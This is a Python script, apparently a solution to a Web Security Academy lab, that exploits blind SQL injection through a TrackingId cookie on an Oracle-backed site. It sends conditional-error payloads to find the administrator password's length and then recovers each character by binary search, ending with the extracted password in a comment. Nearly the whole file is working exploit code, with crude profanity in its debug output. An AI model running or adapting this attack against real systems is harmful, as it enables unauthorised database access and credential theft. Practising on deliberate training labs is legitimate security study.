import requests
requests.packages.urllib3.disable_warnings()

url='https://0ac600e7048116ad802217c2008e0027.web-security-academy.net/'

def head(payload):
    return {"Cookie":f"TrackingId=4ix0QHLmuLOnjVcP{payload}; session=5w3Kj4ej7ZM24IbA1fBpLDUsmlD9Ymqz"}

def f1(payload):
    headers=head(payload)
    res=requests.get(url,headers=headers,allow_redirects=False,verify=False)
    print(headers)
    if 'Server Error' in res.text:
        print('it is fuck')
        return False
    else:
        print('u r right')
        return True

def f2(sz):
    headers=head(f"'||(SELECT CASE WHEN (LENGTH(password)={sz}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
    res=requests.get(url,headers=headers,allow_redirects=False,verify=False)
    #print(res.text)
    print(headers)
    if 'Server Error' in res.text:
        print('RIGHTTTTT')
        return True
    else:
        print('FUCKKKKKK')
        return False


"""
f1("'||(SELECT '' FROM dual)||'")
f1("'||(SELECT username FROM users WHERE username='administrator')||'")
f1("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
f1("'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
f1("'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'")
f1("'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users)||'")
"""

"""
sz=0
for i in range(1,50):
    if f2(i):
        sz=i
        break
print('password size',sz)
"""
sz=20

def f3(idx,c,com):
    headers=head(f"'||(SELECT CASE WHEN ((SELECT SUBSTR(password,{idx},1) FROM users WHERE username='administrator'){com}'{c}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'")
    res=requests.get(url,headers=headers,allow_redirects=False,verify=False)
    if 'Server Error' in res.text:
        print('RIGHTTTTT',c,headers)
        return True
    else:
        print('FUCKKKKKK',c,headers)
        return False

def f4(idx,l,r,is_chr):
    def get(num):
        return chr(num) if is_chr else str(num)
    while l<r:
        mid=(l+r)//2
        c=get(mid)
        if f3(idx,c,'>'):
            l=mid+1
        else:
            r=mid
    assert(f3(idx,get(l),'='))
    return get(l)

ans=''
for i in range(1,sz+1):
    if f3(i,'a','>='):
        # only lowercase
        ans+=f4(i,ord('a'),ord('z')+1,True)
    elif f3(i,'A','>='):
        # uppercase
        ans+=f4(i,ord('A'),ord('Z')+1,True)
    else:
        # only digits
        ans+=f4(i,0,10,False)
    print('CURRRRRR ANSSS',ans)
# CURRRRRR ANSSS v58y0cse2dlm34owgfi5
